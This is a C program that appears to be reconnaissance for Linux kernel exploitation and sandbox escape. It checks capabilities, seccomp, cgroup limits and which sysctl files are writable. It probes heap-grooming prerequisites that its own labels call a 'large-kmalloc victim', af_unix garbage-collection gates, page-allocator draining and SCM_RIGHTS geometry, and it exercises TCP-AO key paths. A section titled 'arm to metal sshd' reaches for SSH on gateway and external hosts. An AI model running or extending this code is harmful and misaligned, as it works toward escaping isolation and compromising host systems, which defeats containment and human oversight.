#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <poll.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sched.h>
#include <linux/io_uring.h>

#ifndef KEY_SPEC_USER_KEYRING
#define KEY_SPEC_USER_KEYRING (-4)
#endif
#ifndef SOL_IP
#define SOL_IP 0
#endif
#ifndef IP_OPTIONS
#define IP_OPTIONS 4
#endif
#ifndef IP_RETOPTS
#define IP_RETOPTS 7
#endif
#ifndef SO_ZEROCOPY
#define SO_ZEROCOPY 60
#endif

static void hdr(const char *s){ printf("\n== %s\n", s); fflush(stdout); }

int main(void){
  hdr("identity");
  printf("pid %d uid %d euid %d\n", getpid(), getuid(), geteuid());
  { FILE *f=fopen("/proc/self/status","r"); char l[256];
    while(f&&fgets(l,sizeof l,f))
      if(!strncmp(l,"CapEff",6)||!strncmp(l,"NoNewPrivs",10)||!strncmp(l,"Seccomp",7)||!strncmp(l,"Cpus_allowed_list",17)) fputs(l,stdout);
    if(f)fclose(f); }

  hdr("cpu");
  printf("online=%d nproc_sysconf=%ld\n", get_nprocs(), sysconf(_SC_NPROCESSORS_ONLN));
  cpu_set_t s; CPU_ZERO(&s);
  if(sched_getaffinity(0,sizeof s,&s)==0){ int c=0,i; for(i=0;i<CPU_SETSIZE;i++) if(CPU_ISSET(i,&s)) c++; printf("affinity mask count=%d\n",c); }
  cpu_set_t t; CPU_ZERO(&t); CPU_SET(0,&t); CPU_SET(1,&t);
  printf("setaffinity{0,1} rc=%d errno=%d(%s)\n", sched_setaffinity(0,sizeof t,&t), errno, strerror(errno));
  { int fd=open("/sys/fs/cgroup/cpuset.cpus",O_RDONLY); char b[128];
    if(fd<0) fd=open("/sys/fs/cgroup/cpuset/cpuset.cpus",O_RDONLY);
    if(fd<0) printf("cpuset file absent\n"); else { int n=read(fd,b,sizeof b -1); b[n>0?n:0]=0; printf("cp=\"%s\"\n",b); close(fd);} }

  hdr("memory ceiling");
  { const char *p[]={"/sys/fs/cgroup/memory.max","/sys/fs/cgroup/memory.high","/sys/fs/cgroup/memory.current","/sys/fs/cgroup/cpu.max",0};
    for(int i=0;p[i];i++){ int fd=open(p[i],O_RDONLY); char b[64];
      if(fd<0){ printf("%s absent\n",p[i]); continue; }
      int n=read(fd,b,sizeof b -1); b[n>0?n:0]=0; printf("%s = %s\n",p[i],b); close(fd); }
    FILE *f=fopen("/proc/meminfo","r"); char l[128];
    while(f&&fgets(l,sizeof l,f)) if(strstr(l,"MemTotal")||strstr(l,"MemAvailable")) fputs(l,stdout); if(f)fclose(f); }

  hdr("alloc ladder");
  { size_t mb[]={128,256,512,1024,2048,0};
    for(int i=0;mb[i];i++){ size_t n=mb[i]<<20;
      void *p=mmap(0,n,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
      if(p==MAP_FAILED){ printf("%zu MiB mmap FAIL errno=%d(%s)\n",mb[i],errno,strerror(errno)); continue; }
      int bad=0; for(size_t o=0;o<n;o+=4096) { *(volatile char*)((char*)p+o)=0x41; }
      printf("%zu MiB %s\n",mb[i], bad?"partial":"OK");
      munmap(p,n); } }

  hdr("io_uring");
  { struct io_uring_params prm; memset(&prm,0,sizeof prm);
    long r=syscall(__NR_io_uring_setup,8,&prm);
    printf("io_uring_setup rc=%ld errno=%d(%s)\n",r,errno,strerror(errno)); }

  hdr("keyring");
  { long r=syscall(SYS_add_key,"user","probe","abcde",5,KEY_SPEC_USER_KEYRING);
    printf("add_key rc=%ld errno=%d(%s)\n",r,errno,strerror(errno));
    if(r>0){ char d[256]; long q=syscall(SYS_keyctl,3 /*KEYCTL_DESCRIBE*/,r,d,sizeof d);
      printf("describe rc=%ld errno=%d(%s) d=%s\n",q,errno,strerror(errno),q>0?d:""); }
    { int fd=open("/proc/keys",O_RDONLY); printf("/proc/keys open rc=%d errno=%d\n",fd,errno); if(fd>=0)close(fd); } }

  hdr("TCP-AO ADD_KEY at CapEff 0");
  { const char *algs[]={"hmac(sha256)","hmac(sha1)","cmac(aes128)","hmac(md5)",0};
    int ml[]={12,12,12,12,0}; (void)ml;
    for(int i=0;algs[i];i++){
      unsigned char c[288]; memset(c,0,sizeof c);
      c[0]=2; c[1]=0;                                  /* ss_family AF_INET, host order */
      memcpy(c+128,algs[i],strlen(algs[i]));
      c[205]=12; c[207]=32; memset(c+208,'K',32);      /* maclen, keylen, key */
      c[203]=1; c[204]=1;                              /* sndid, rcvid */
      int fd=socket(AF_INET,SOCK_STREAM,0);
      int r=setsockopt(fd,IPPROTO_TCP,38,c,sizeof c);
      printf("ADD_KEY %-14s rc=%d errno=%d(%s)\n",algs[i],r,r?errno:0,r?strerror(errno):"");
      if(!r){ unsigned char inf[128]; int l=sizeof inf;
        int g=getsockopt(fd,IPPROTO_TCP,40,inf,&l);
        printf("   AO_INFO get rc=%d len=%d cur=%d rnext=%d ao_required=%d\n",g,l,inf[4]&1,(inf[4]>>1)&1,(inf[4]>>2)&1);
        unsigned char d[288]; memset(d,0,sizeof d); memcpy(d,c,128); d[202]=0;
        int del=setsockopt(fd,IPPROTO_TCP,39,d,sizeof d);
        printf("   DEL_KEY rc=%d errno=%d(%s)\n",del,del?errno:0,del?strerror(errno):""); }
      close(fd); }
    /* connect_init path: key installed, then connect elsewhere so the key is call_rcu'd */
    { unsigned char c[288]; memset(c,0,sizeof c);
      c[0]=2; c[1]=0; memcpy(c+128,"hmac(sha256)",12); c[205]=12; c[207]=32; memset(c+208,'K',32); c[203]=1; c[204]=1;
      int fd=socket(AF_INET,SOCK_STREAM,0);
      int r=setsockopt(fd,IPPROTO_TCP,38,c,sizeof c);
      struct sockaddr_in sa; memset(&sa,0,sizeof sa); sa.sin_family=AF_INET; sa.sin_port=htons(9); inet_pton(AF_INET,"127.0.0.1",&sa.sin_addr);
      int cr=connect(fd,(struct sockaddr*)&sa,sizeof sa);
      printf("reconnect-after-key add=%d connect=%d errno=%d(%s)\n",r,cr,cr?errno:0,cr?strerror(errno):"");
      close(fd); } }

  hdr("af_unix geometry (bounded, no GC storm)");
  { int ok=0; for(int i=0;i<500;i++){ int v[2]; if(socketpair(AF_UNIX,SOCK_STREAM,0,v)) break;
      struct msghdr m; struct iovec io; char b='x'; struct cmsghdr *c; char ctl[64];
      io.iov_base=&b; io.iov_len=1; memset(&m,0,sizeof m); m.msg_iov=&io; m.msg_iovlen=1;
      m.msg_control=ctl; m.msg_controllen=CMSG_SPACE(sizeof(int)); memset(ctl,0,sizeof ctl); c=CMSG_FIRSTHDR(&m);
      c->cmsg_level=SOL_SOCKET; c->cmsg_type=SCM_RIGHTS; c->cmsg_len=CMSG_LEN(sizeof(int));
      memcpy(CMSG_DATA(c),&v[1],sizeof(int));
      if(sendmsg(v[0],&m,0)<0) break; close(v[0]); close(v[1]); ok++; }
    printf("scm_rights sends ok=%d errno=%d\n",ok,errno);
    int mfd=socket(AF_UNIX,SOCK_DGRAM,0); struct sockaddr_un au; memset(&au,0,sizeof au);
    au.sun_family=AF_UNIX; snprintf(au.sun_path,sizeof au.sun_path,"/tmp/kgate-absent");
    printf("unix bind tmp rc=%d errno=%d\n", bind(mfd,(struct sockaddr*)&au,sizeof au),errno); close(mfd); }

  hdr("IP_OPTIONS arm to metal sshd");
  { unsigned char rr[8]={0x07,0x07,0x04,0,0,0,0,0};
    const char *hosts[]={"192.168.32.1","172.31.0.1","147.5.115.161",0};
    for(int h=0;hosts[h];h++) for(int variant=0;variant<2;variant++){
      struct sockaddr_in sa; memset(&sa,0,sizeof sa);
      sa.sin_family=AF_INET; sa.sin_port=htons(22); inet_pton(AF_INET,hosts[h],&sa.sin_addr);
      int fd=socket(AF_INET,SOCK_STREAM,0); int one=1;
      struct timeval tv; tv.tv_sec=4; tv.tv_usec=0;
      setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof tv);
      setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof tv);
      setsockopt(fd,SOL_IP,IP_RETOPTS,&one,sizeof one);
      if(variant) setsockopt(fd,SOL_IP,IP_OPTIONS,rr,sizeof rr);
      int fl=fcntl(fd,F_GETFL,0); fcntl(fd,F_SETFL,fl|O_NONBLOCK);
      int rc=connect(fd,(struct sockaddr*)&sa,sizeof sa);
      int cens=(rc<0)?errno:0;
      if(rc<0 && cens!=EINPROGRESS){ printf("%s %-4s connect errno=%d\n",hosts[h],variant?"RR":"none",cens); close(fd); continue; }
      struct pollfd pf; pf.fd=fd; pf.events=POLLOUT; pf.revents=0;
      if(poll(&pf,1,3000)<=0){ printf("%s %-4s connect timeout\n",hosts[h],variant?"RR":"none"); close(fd); continue; }
      int soerr=0; socklen_t sl=sizeof soerr; getsockopt(fd,SOL_SOCKET,SO_ERROR,&soerr,&sl);
      fcntl(fd,F_SETFL,fcntl(fd,F_GETFL,0)&~O_NONBLOCK);
      char buf[48]; int n=(int)recv(fd,buf,sizeof buf,0);
      unsigned char back[64]; int bl=(int)sizeof back;
      int gr=getsockopt(fd,SOL_IP,IP_RETOPTS,back,&bl);
      printf("%s %-4s so_error=%d recv=%d banner=\"%.*s\" retopts_get=%d len=%d bytes=",
             hosts[h],variant?"RR":"none",soerr,n,n>0?n:0,n>0?buf:"",gr,bl);
      for(int i=0;i<(bl>0&&bl<16?bl:0);i++) printf("%02x",back[i]);
      printf("\n"); close(fd); } }

  hdr("btf / lockdown / sysctls");
  { int fd=open("/sys/kernel/btf/vmlinux",O_RDONLY); unsigned char b[8];
    if(fd<0) printf("btf open errno=%d\n",errno); else { int n=read(fd,b,8); printf("btf read n=%d magic=%02x%02x\n",n,n>1?b[0]:0,n>1?b[1]:0); close(fd);} }
  { int fd=open("/sys/kernel/security/lockdown",O_RDONLY); char b[128];
    if(fd<0) printf("lockdown open errno=%d\n",errno); else { int n=read(fd,b,sizeof b -1); b[n>0?n:0]=0; printf("lockdown: %s",b); close(fd);} }
  { const char *p[]={"/proc/sys/kernel/kptr_restrict","/proc/sys/kernel/dmesg_restrict","/proc/sys/kernel/io_uring_disabled","/proc/sys/kernel/modules_disabled","/proc/sys/kernel/perf_event_paranoid","/proc/sys/net/ipv4/tcp_migrate_req","/proc/sys/net/ipv4/ip_unprivileged_port_start",0};
    for(int i=0;p[i];i++){ int fd=open(p[i],O_RDONLY); char b[64];
      if(fd<0){ printf("%s absent\n",p[i]); continue; }
      int n=read(fd,b,sizeof b -1); b[n>0?n:0]=0; printf("%s = %s\n",p[i],b); close(fd);
      int w=open(p[i],O_WRONLY); printf("   writability: %s\n", w<0?"no":"YES"); if(w>=0)close(w); } }

  hdr("unshare / userns");
  printf("unshare(CLONE_NEWUSER|CLONE_NEWNS) rc=%d errno=%d(%s)\n",
     (int)syscall(__NR_unshare,CLONE_NEWUSER|CLONE_NEWNS),errno,strerror(errno));

  hdr("RLIMIT_NOFILE gate (af_unix GC prerequisite)");
  { struct rlimit rl;
    if(getrlimit(RLIMIT_NOFILE,&rl)==0)
      printf("soft=%llu hard=%llu  need_soft>=2024: %s\n",
             (unsigned long long)rl.rlim_cur,(unsigned long long)rl.rlim_max,
             rl.rlim_cur>=2024?"YES":"NO");
    struct rlimit n=rl; if(n.rlim_max==RLIM_INFINITY) n.rlim_cur=1048576; else n.rlim_cur=n.rlim_max;
    int r=setrlimit(RLIMIT_NOFILE,&n);
    printf("raise soft->hard rc=%d errno=%d(%s) new soft=%llu\n",r,r?errno:0,r?strerror(errno):"",
           (unsigned long long)(getrlimit(RLIMIT_NOFILE,&rl)==0?rl.rlim_cur:0));
    static int held[8192]; int openable=0;
    for(int i=0;i<8192;i++){ int fd=open("/dev/null",O_RDONLY); if(fd<0) break; held[openable++]=fd; }
    printf("openable devnull fds=%d errno=%d(%s)\n",openable,errno,strerror(errno));
    fflush(stdout);
    for(int i=0;i<openable;i++) close(held[i]); }

  hdr("large-kmalloc victim (>=64 KiB linear datagram)");
  { int sv[2]; if(socketpair(AF_UNIX,SOCK_DGRAM,0,sv)==0){
      int big=128*1024;
      for(int sz=70000; sz<=1048576; sz*=2){
        char *b=malloc(sz); if(!b) break; memset(b,0x42,sz);
        int w=write(sv[1],b,sz);
        printf("unix dgram %d bytes write=%d errno=%d(%s)\n",sz,w,w<0?errno:0,w<0?strerror(errno):"");
        if(w>0){ char r[16]; int rr=read(sv[0],r,sizeof r); (void)rr; }
        free(b); if(w<0) break; } }
    int u=socket(AF_INET,SOCK_DGRAM,0);
    char *b=malloc(200000); memset(b,0x42,200000);
    int w=send(u,b,200000,0); printf("udp 200000 send=%d errno=%d(%s)\n",w,w<0?errno:0,w<0?strerror(errno):"");
    free(b); close(u); }

  hdr("PCP drain substitute / cgroup knobs");
  { void *p=mmap(0,4*1024*1024,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(p!=MAP_FAILED){ for(size_t o=0;o<4*1024*1024;o+=4096) *(volatile char*)((char*)p+o)=1;
      int r=madvise(p,2*1024*1024,MADV_COLLAPSE);
      printf("MADV_COLLAPSE rc=%d errno=%d(%s)\n",r,r?errno:0,r?strerror(errno):""); munmap(p,4*1024*1024); }
    const char *p2[]={"/sys/fs/cgroup/memory.reclaim","/sys/fs/cgroup/memory.pressure","/sys/fs/cgroup/cpu.pressure",0};
    for(int i=0;p2[i];i++){ int fd=open(p2[i],O_WRONLY); printf("%s write-open: %s\n",p2[i],fd<0?"no":"YES"); if(fd>=0)close(fd); } }

  hdr("253-fd SCM_RIGHTS send (geometry test)");
  { int sv[2]; if(socketpair(AF_UNIX,SOCK_STREAM,0,sv)==0){
      int fds[253]; int n=0;
      for(int i=0;i<253;i++){ int v[2]; if(socketpair(AF_UNIX,SOCK_STREAM,0,v)) break; fds[n++]=v[0]; close(v[1]); }
      char b='x'; struct iovec io={&b,1};
      size_t ctl=CMSG_SPACE(sizeof(int)*n); char *c=malloc(ctl); memset(c,0,ctl);
      struct cmsghdr *ch=(struct cmsghdr*)c; ch->cmsg_level=SOL_SOCKET; ch->cmsg_type=SCM_RIGHTS; ch->cmsg_len=CMSG_LEN(sizeof(int)*n);
      for(int i=0;i<n;i++) memcpy(CMSG_DATA(ch)+i*sizeof(int),&fds[i],sizeof(int));
      struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&io; m.msg_iovlen=1; m.msg_control=c; m.msg_controllen=ctl;
      int r=sendmsg(sv[1],&m,0);
      printf("sent %d fds in one cmsg rc=%d errno=%d(%s)\n",n,r,r<0?errno:0,r<0?strerror(errno):"");
      for(int i=0;i<n;i++) close(fds[i]); free(c); close(sv[0]); close(sv[1]); } }

  hdr("done"); fflush(stdout);
  return 0;
}
